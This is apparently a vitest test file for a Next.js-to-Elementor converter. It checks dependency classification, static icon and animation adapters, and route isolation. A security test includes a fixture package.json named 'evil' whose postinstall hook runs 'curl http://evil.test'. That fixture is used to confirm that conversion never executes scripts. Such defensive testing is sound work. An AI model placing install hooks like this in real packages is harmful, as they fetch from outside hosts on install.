/**
 * Phase 13e — dependency capability registry + thin static adapters.
 * Static analysis only: never installs, loads node_modules, or executes packages.
 */

import { describe, expect, it, vi } from "vitest";
import * as fs from "node:fs";
import * as path from "node:path";
import {
  analyzeRouteDependencies,
  applyDependencyAnalysisToUnit,
  buildConversionUnit,
  convertProject,
  createProjectVirtualFSFromTextFiles,
  DEPENDENCY_REGISTRY,
  dependencyForcesRoutePartial,
  discoverExternalImports,
  getAdapter,
  listRegisteredPackages,
  lookupDependencyRegistry,
  packageNameFromSpecifier,
} from "@/lib/converter";
import { rewriteMotionSourceText } from "@/lib/converter/project/deps/adapters/framer-motion";
import { lucideReactAdapter } from "@/lib/converter/project/deps/adapters/lucide";
import { carouselAdapter } from "@/lib/converter/project/deps/adapters/carousel";
import { chartsAdapter } from "@/lib/converter/project/deps/adapters/charts";
import { framerMotionAdapter } from "@/lib/converter/project/deps/adapters/framer-motion";

function vfs(files: Record<string, string>) {
  return createProjectVirtualFSFromTextFiles(files);
}

describe("project Phase 13e: dependency registry", () => {
  it("classifies known visual adapter packages", () => {
    expect(lookupDependencyRegistry("lucide-react")?.category).toBe(
      "supported-adapter",
    );
    expect(lookupDependencyRegistry("framer-motion")?.adapter).toBe(
      "framer-motion",
    );
  });

  it("classifies utility-only packages", () => {
    for (const name of ["clsx", "classnames", "zod", "lodash"]) {
      expect(lookupDependencyRegistry(name)?.category).toBe("utility-only");
      expect(lookupDependencyRegistry(name)?.forcesPartial).toBe(false);
    }
  });

  it("classifies unknown packages as undefined registry entries", () => {
    expect(lookupDependencyRegistry("unknown-animation-package")).toBeUndefined();
  });

  it("classifies runtime/data packages", () => {
    expect(lookupDependencyRegistry("axios")?.category).toBe(
      "dynamic/runtime-dependent",
    );
    expect(lookupDependencyRegistry("@tanstack/react-query")?.category).toBe(
      "dynamic/runtime-dependent",
    );
  });

  it("attaches version metadata from package.json ranges", () => {
    const result = convertProject(
      vfs({
        "package.json": JSON.stringify({
          dependencies: {
            next: "14.0.0",
            react: "18.0.0",
            "lucide-react": "^0.400.0",
          },
        }),
        "app/page.tsx": `
          import { Check } from "lucide-react";
          export default function Home() {
            return <div><Check size={20} /><h1>Home</h1></div>;
          }
        `,
      }),
    );
    const lucide = result.routes[0]?.dependencies?.find(
      (d) => d.packageName === "lucide-react",
    );
    expect(lucide?.versionRange).toBe("^0.400.0");
  });

  it("packageNameFromSpecifier handles scoped and nested keys", () => {
    expect(packageNameFromSpecifier("@tanstack/react-query")).toBe(
      "@tanstack/react-query",
    );
    expect(packageNameFromSpecifier("swiper/react")).toBe("swiper/react");
    expect(packageNameFromSpecifier("lodash/get")).toBe("lodash");
  });

  it("lists registered packages from the centralized registry", () => {
    const listed = listRegisteredPackages();
    expect(listed).toContain("lucide-react");
    expect(listed).toContain("clsx");
    expect(listed).toEqual(
      Object.keys(DEPENDENCY_REGISTRY).sort((a, b) => a.localeCompare(b)),
    );
  });
});

describe("project Phase 13e: local vs external discovery", () => {
  it("treats relative imports as local (not external packages)", () => {
    const hits = discoverExternalImports({
      "app/page.tsx": `
        import Button from "./Button";
        import { Card } from "../ui/Card";
        import { Check } from "lucide-react";
        export default function Page(){return <div/>}
      `,
    });
    expect(hits.every((h) => h.packageName !== "./Button")).toBe(true);
    expect(hits.some((h) => h.packageName === "lucide-react")).toBe(true);
  });

  it("does not treat project-local components as npm packages", () => {
    const result = convertProject(
      vfs({
        "package.json": JSON.stringify({
          dependencies: { next: "14.0.0", react: "18.0.0" },
        }),
        "app/page.tsx": `
          import { Button } from "./Button";
          export default function Home() {
            return <Button />;
          }
        `,
        "app/Button.tsx": `
          export function Button() {
            return <button>Click</button>;
          }
        `,
      }),
    );
    const pkgs = (result.routes[0]?.dependencies ?? []).map((d) => d.packageName);
    expect(pkgs).not.toContain("./Button");
    expect(pkgs).not.toContain("Button");
  });
});

describe("project Phase 13e: lucide-react adapter", () => {
  it("adapts named static icons without loading lucide-react", () => {
    const applied = lucideReactAdapter.apply({
      packageName: "lucide-react",
      hits: [
        {
          specifier: "lucide-react",
          packageName: "lucide-react",
          fromPath: "app/page.tsx",
          localNames: ["Check", "ArrowRight"],
          isNamespace: false,
          isDefault: false,
          isSideEffect: false,
        },
      ],
      moduleSources: {
        "app/page.tsx": `
          import { Check, ArrowRight } from "lucide-react";
          export default function Home() {
            return <div><Check size={20} /><ArrowRight className="w-4" /></div>;
          }
        `,
      },
      entryFile: "app/page.tsx",
      entrySource: "",
    });
    expect(applied.status).toBe("supported");
    expect(applied.knownComponentSources?.Check).toContain('data-icon="check"');
    expect(applied.knownComponentSources?.ArrowRight).toContain(
      'data-icon="arrow-right"',
    );
  });

  it("marks dynamic icon usage unsupported", () => {
    const applied = lucideReactAdapter.apply({
      packageName: "lucide-react",
      hits: [
        {
          specifier: "lucide-react",
          packageName: "lucide-react",
          fromPath: "app/page.tsx",
          localNames: ["Check"],
          isNamespace: false,
          isDefault: false,
          isSideEffect: false,
        },
      ],
      moduleSources: {
        "app/page.tsx": `
          import { Check } from "lucide-react";
          const icons = { Check };
          const Icon = icons[name];
          export default function Home(){return <Icon />}
        `,
      },
      entryFile: "app/page.tsx",
      entrySource: "",
    });
    expect(applied.status).toBe("unsupported");
    expect(applied.diagnostics.some((d) => d.code === "dependency-dynamic-usage")).toBe(
      true,
    );
  });

  it("integrates lucide into route conversion with adapter diagnostic", () => {
    const result = convertProject(
      vfs({
        "package.json": JSON.stringify({
          dependencies: {
            next: "14.0.0",
            react: "18.0.0",
            "lucide-react": "0.400.0",
          },
        }),
        "app/page.tsx": `
          import { Check } from "lucide-react";
          export default function Home() {
            return (
              <section>
                <Check size={20} />
                <h1>Done</h1>
              </section>
            );
          }
        `,
      }),
    );
    const route = result.routes[0]!;
    expect(route.dependencies?.some((d) => d.packageName === "lucide-react")).toBe(
      true,
    );
    expect(
      route.diagnostics.some((d) => d.code === "dependency-adapter-applied"),
    ).toBe(true);
    expect(route.conversion.elementorJson).not.toBeNull();
  });
});

describe("project Phase 13e: framer-motion adapter", () => {
  it("rewrites motion wrappers and strips animation props", () => {
    const src = `
      import { motion } from "framer-motion";
      export default function Home() {
        return (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="box">
            <h1>Hello</h1>
          </motion.div>
        );
      }
    `;
    const out = rewriteMotionSourceText(src);
    expect(out.removedImport).toBe(true);
    expect(out.motionTags).toBeGreaterThan(0);
    expect(out.code).toContain("<div");
    expect(out.code).not.toContain("motion.div");
    expect(out.code).not.toContain("initial=");
    expect(out.code).not.toContain("animate=");
    expect(out.code).toContain("<h1>Hello</h1>");
  });

  it("produces animation-not-preserved diagnostic and keeps children convertible", () => {
    const result = convertProject(
      vfs({
        "package.json": JSON.stringify({
          dependencies: {
            next: "14.0.0",
            react: "18.0.0",
            "framer-motion": "11.0.0",
          },
        }),
        "app/page.tsx": `
          import { motion } from "framer-motion";
          export default function Home() {
            return (
              <motion.section transition={{ duration: 0.2 }}>
                <h1>Animated title</h1>
                <p>Static copy</p>
              </motion.section>
            );
          }
        `,
      }),
    );
    const route = result.routes[0]!;
    expect(
      route.diagnostics.some(
        (d) => d.code === "dependency-animation-not-preserved",
      ),
    ).toBe(true);
    expect(route.outcome === "partial" || route.outcome === "complete").toBe(true);
    expect(route.conversion.elementorJson).not.toBeNull();
    const fm = route.dependencies?.find((d) => d.packageName === "framer-motion");
    expect(fm?.status).toBe("partial");
  });

  it("marks AnimatePresence / useAnimation as unsupported", () => {
    const applied = framerMotionAdapter.apply({
      packageName: "framer-motion",
      hits: [
        {
          specifier: "framer-motion",
          packageName: "framer-motion",
          fromPath: "app/page.tsx",
          localNames: ["AnimatePresence", "motion"],
          isNamespace: false,
          isDefault: false,
          isSideEffect: false,
        },
      ],
      moduleSources: {
        "app/page.tsx": `
          import { AnimatePresence, motion } from "framer-motion";
          export default function Home() {
            return <AnimatePresence><motion.div /></AnimatePresence>;
          }
        `,
      },
      entryFile: "app/page.tsx",
      entrySource: "",
    });
    expect(applied.status).toBe("unsupported");
  });
});

describe("project Phase 13e: carousel + charts", () => {
  it("classifies static carousel as partial unsupported interactivity", () => {
    const applied = carouselAdapter.apply({
      packageName: "swiper/react",
      hits: [],
      moduleSources: {
        "app/page.tsx": `
          import { Swiper, SwiperSlide } from "swiper/react";
          export default function Home() {
            return (
              <Swiper>
                <SwiperSlide><h2>One</h2></SwiperSlide>
                <SwiperSlide><h2>Two</h2></SwiperSlide>
              </Swiper>
            );
          }
        `,
      },
      entryFile: "app/page.tsx",
      entrySource: "",
    });
    expect(applied.status).toBe("partial");
    expect(applied.diagnostics.some((d) => d.code === "dependency-unsupported")).toBe(
      true,
    );
  });

  it("marks dynamic carousel slides unsupported", () => {
    const applied = carouselAdapter.apply({
      packageName: "embla-carousel-react",
      hits: [],
      moduleSources: {
        "app/page.tsx": `
          const slides = data.map((s) => <Slide key={s.id}>{s.title}</Slide>);
          export default function Home(){return <div>{slides}</div>}
        `,
      },
      entryFile: "app/page.tsx",
      entrySource: "",
    });
    expect(applied.status).toBe("unsupported");
  });

  it("does not invent chart data; charts are unsupported", () => {
    const applied = chartsAdapter.apply({
      packageName: "recharts",
      hits: [],
      moduleSources: {
        "app/page.tsx": `
          import { LineChart } from "recharts";
          const data = [{x:1,y:2}];
          export default function Home(){return <LineChart data={data} />}
        `,
      },
      entryFile: "app/page.tsx",
      entrySource: "",
    });
    expect(applied.status).toBe("unsupported");
    expect(applied.diagnostics[0]?.message).toMatch(/never invented/i);
  });

  it("integrates chart classification into route diagnostics", () => {
    const result = convertProject(
      vfs({
        "package.json": JSON.stringify({
          dependencies: {
            next: "14.0.0",
            react: "18.0.0",
            recharts: "2.0.0",
          },
        }),
        "app/page.tsx": `
          import { LineChart } from "recharts";
          export default function Home() {
            return (
              <section>
                <h1>Stats</h1>
                <LineChart width={100} height={100} />
              </section>
            );
          }
        `,
      }),
    );
    const route = result.routes[0]!;
    expect(route.dependencies?.find((d) => d.packageName === "recharts")?.status).toBe(
      "unsupported",
    );
    expect(route.outcome).toBe("partial");
  });
});

describe("project Phase 13e: runtime + forms", () => {
  it("does not execute axios/fetch; reports runtime-only; keeps static form convertible", () => {
    const result = convertProject(
      vfs({
        "package.json": JSON.stringify({
          dependencies: {
            next: "14.0.0",
            react: "18.0.0",
            axios: "1.6.0",
          },
        }),
        "app/page.tsx": `
          import axios from "axios";
          export default function Contact() {
            const onSubmit = () => { axios.post("/api"); fetch("/api"); };
            return (
              <form>
                <input name="email" />
                <button type="submit">Submit</button>
              </form>
            );
          }
        `,
      }),
    );
    const route = result.routes[0]!;
    expect(route.dependencies?.find((d) => d.packageName === "axios")?.category).toBe(
      "dynamic/runtime-dependent",
    );
    expect(
      route.diagnostics.some((d) => d.code === "dependency-runtime-only"),
    ).toBe(true);
    expect(route.conversion.elementorJson).not.toBeNull();
  });
});

describe("project Phase 13e: route isolation + integration", () => {
  it("does not poison route B when route A has an unknown dependency", () => {
    const result = convertProject(
      vfs({
        "package.json": JSON.stringify({
          dependencies: {
            next: "14.0.0",
            react: "18.0.0",
            "lucide-react": "0.400.0",
            "weird-visual-lib": "1.0.0",
          },
        }),
        "app/page.tsx": `
          import { Check } from "lucide-react";
          export default function Home() {
            return <div><Check /><h1>Home</h1></div>;
          }
        `,
        "app/about/page.tsx": `
          import Weird from "weird-visual-lib";
          export default function About() {
            return <div><Weird /><h1>About</h1></div>;
          }
        `,
      }),
    );
    expect(result.routes).toHaveLength(2);
    const home = result.routes.find((r) => r.route.path === "/")!;
    const about = result.routes.find((r) => r.route.path === "/about")!;
    expect(home.dependencies?.some((d) => d.packageName === "weird-visual-lib")).toBe(
      false,
    );
    expect(about.dependencies?.some((d) => d.packageName === "weird-visual-lib")).toBe(
      true,
    );
    expect(about.dependencies?.find((d) => d.packageName === "weird-visual-lib")?.status).toBe(
      "unknown",
    );
    // Home should still produce usable Elementor JSON.
    expect(home.conversion.elementorJson).not.toBeNull();
    // About may still convert static shell; unknown forces ≤ partial when complete.
    if (about.conversion.outcome === "complete") {
      expect(about.outcome).toBe("partial");
    }
  });

  it("utility-only deps do not fail visual conversion", () => {
    const result = convertProject(
      vfs({
        "package.json": JSON.stringify({
          dependencies: {
            next: "14.0.0",
            react: "18.0.0",
            clsx: "2.0.0",
            zod: "3.0.0",
          },
        }),
        "app/page.tsx": `
          import clsx from "clsx";
          import { z } from "zod";
          const schema = z.string();
          export default function Home() {
            return <h1 className={clsx("text-xl")}>Hello</h1>;
          }
        `,
      }),
    );
    const route = result.routes[0]!;
    expect(route.dependencies?.find((d) => d.packageName === "clsx")?.category).toBe(
      "utility-only",
    );
    expect(route.conversion.elementorJson).not.toBeNull();
  });

  it("preserves ConversionResult shape on routes", () => {
    const result = convertProject(
      vfs({
        "package.json": JSON.stringify({
          dependencies: { next: "14.0.0", react: "18.0.0" },
        }),
        "app/page.tsx": `export default function Home(){return <h1>Hi</h1>;}`,
      }),
    );
    const c = result.routes[0]!.conversion;
    expect(c).toHaveProperty("outcome");
    expect(c).toHaveProperty("elementorJson");
    expect(c).toHaveProperty("report");
    expect(c).toHaveProperty("catalogVersion");
    expect(result).toHaveProperty("projectReport");
    expect(result).toHaveProperty("manifest");
  });

  it("dependencyForcesRoutePartial only for visual gaps", () => {
    expect(
      dependencyForcesRoutePartial([
        {
          packageName: "clsx",
          category: "utility-only",
          status: "informational",
          affectsVisual: false,
          forcesPartial: false,
          notes: "",
          importedFrom: [],
          localNames: [],
          diagnostics: [],
        },
      ]),
    ).toBe(false);
    expect(
      dependencyForcesRoutePartial([
        {
          packageName: "recharts",
          category: "visual-but-unsupported",
          status: "unsupported",
          affectsVisual: true,
          forcesPartial: true,
          notes: "",
          importedFrom: [],
          localNames: [],
          diagnostics: [],
        },
      ]),
    ).toBe(true);
  });

  it("getAdapter returns registered thin adapters only", () => {
    expect(getAdapter("lucide-react")?.id).toBe("lucide-react");
    expect(getAdapter("not-real")).toBeUndefined();
  });
});

describe("project Phase 13e: security guarantees", () => {
  it("never calls package managers or eval during convertProject", () => {
    const childProcess = require("node:child_process") as typeof import("node:child_process");
    const spawnSync = vi.spyOn(childProcess, "spawnSync");
    const execSync = vi.spyOn(childProcess, "execSync");
    const evalSpy = vi.spyOn(globalThis, "eval");

    try {
      convertProject(
        vfs({
          "package.json": JSON.stringify({
            name: "evil",
            scripts: {
              preinstall: "node -e \"process.exit(1)\"",
              postinstall: "curl http://evil.test",
              start: "node server.js",
            },
            dependencies: {
              next: "14.0.0",
              react: "18.0.0",
              "lucide-react": "0.400.0",
              "framer-motion": "11.0.0",
              axios: "1.0.0",
              recharts: "2.0.0",
            },
          }),
          "app/page.tsx": `
            import { Check } from "lucide-react";
            import { motion } from "framer-motion";
            import axios from "axios";
            import { LineChart } from "recharts";
            export default function Home() {
              axios.get("/x");
              return (
                <motion.div animate={{ opacity: 1 }}>
                  <Check />
                  <LineChart width={10} height={10} />
                  <h1>ok</h1>
                </motion.div>
              );
            }
          `,
        }),
      );
    } finally {
      expect(spawnSync).not.toHaveBeenCalled();
      expect(execSync).not.toHaveBeenCalled();
      expect(evalSpy).not.toHaveBeenCalled();
      spawnSync.mockRestore();
      execSync.mockRestore();
      evalSpy.mockRestore();
    }
  });

  it("does not load uploaded node_modules lucide-react", () => {
    const result = convertProject(
      vfs({
        "package.json": JSON.stringify({
          dependencies: {
            next: "14.0.0",
            "lucide-react": "0.400.0",
          },
        }),
        "app/page.tsx": `
          import { Check } from "lucide-react";
          export default function Home(){return <Check />}
        `,
      }),
    );
    const lucide = result.routes[0]?.dependencies?.find(
      (d) => d.packageName === "lucide-react",
    );
    expect(lucide?.adapter).toBe("lucide-react");
    expect(lucide?.status).toBe("supported");
    // Stub comes from adapter metadata, not node_modules.
    expect(
      result.routes[0]?.unit?.knownComponentSources.Check,
    ).toContain('data-icon="check"');
  });

  it("adapters source files never import real packages", () => {
    const adapterDir = path.join(
      process.cwd(),
      "lib/converter/project/deps/adapters",
    );
    for (const file of fs.readdirSync(adapterDir)) {
      if (!file.endsWith(".ts")) continue;
      const text = fs.readFileSync(path.join(adapterDir, file), "utf8");
      expect(text).not.toMatch(
        /from\s+['"]lucide-react['"]|require\(['"]lucide-react['"]\)/,
      );
      expect(text).not.toMatch(
        /from\s+['"]framer-motion['"]|require\(['"]framer-motion['"]\)/,
      );
      expect(text).not.toMatch(/\beval\s*\(|new\s+Function\b|\bvm\.|node:vm/);
    }
  });

  it("analyzeRouteDependencies never resolves node_modules paths", () => {
    const unit = buildConversionUnit(
      vfs({
        "package.json": JSON.stringify({
          dependencies: { next: "14.0.0", "lucide-react": "1.0.0" },
        }),
        "app/page.tsx": `
          import { Check } from "lucide-react";
          export default function Home(){return <Check />}
        `,
      }),
      {
        id: "app:/",
        path: "/",
        kind: "page",
        entryFile: "app/page.tsx",
        layoutChain: [],
        dynamicSegments: [],
        isDynamic: false,
        confidence: "high",
        source: "app-router",
      },
      { framework: "next-app" },
    );
    const analysis = analyzeRouteDependencies(unit, {
      "lucide-react": "1.0.0",
    });
    const applied = applyDependencyAnalysisToUnit(unit, analysis);
    expect(Object.keys(applied.knownComponentSources)).toContain("Check");
    expect(applied.knownComponentSources.Check).toContain("data-icon");
    expect(applied.knownComponentSources.Check).not.toContain("node_modules");
  });
});
